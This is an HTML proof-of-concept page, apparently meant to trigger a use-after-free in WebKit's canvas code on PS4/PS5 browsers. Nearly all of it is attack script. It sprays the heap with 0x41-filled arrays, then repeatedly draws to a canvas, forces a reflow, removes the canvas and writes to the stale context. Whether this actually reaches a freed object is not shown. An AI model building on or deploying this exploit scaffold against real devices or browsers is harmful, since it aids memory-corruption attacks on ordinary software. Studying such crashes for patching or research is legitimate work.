<!DOCTYPE html>
<html>
<head>
  <title>Heap UAF - PS WebKit Test</title>
  <style>
    #target {
      content-visibility: auto;
    }
  </style>
</head>
<body>
  <h1>PoC - WebKit UAF Canvas (PS4/PS5)</h1>
  <div id="target">
    <canvas id="crashCanvas" width="256" height="256"></canvas>
  </div>

  <script>
    const canvas = document.getElementById('crashCanvas');
    const ctx = canvas.getContext('2d');

    function stress() {
      const target = document.getElementById('target');

      // Step 1: Draw into canvas and store buffer
      ctx.fillRect(0, 0, 256, 256);
      const imageData = ctx.getImageData(0, 0, 256, 256);

      // Step 2: Manipulate content-visibility and force DOM reflow
      target.style.contentVisibility = 'hidden';
      target.offsetHeight; // Force reflow

      // Step 3: Remove canvas
      target.innerHTML = '';

      // Step 4: Attempt to use after free
      try {
        ctx.putImageData(imageData, 0, 0);
        console.log('putImageData completed.');
      } catch (e) {
        console.log('Exception during putImageData:', e);
      }

      // Optional: Re-add canvas and repeat
      const newCanvas = document.createElement('canvas');
      newCanvas.width = 256;
      newCanvas.height = 256;
      newCanvas.getContext('2d').fillRect(0, 0, 10, 10);
      target.appendChild(newCanvas);

      setTimeout(stress, 50);
    }

    // Heap grooming
    let arr = [];
    for (let i = 0; i < 10000; i++) {
      arr.push(new Array(1000).fill(0x41));
    }

    setTimeout(stress, 500);
  </script>
</body>
</html>
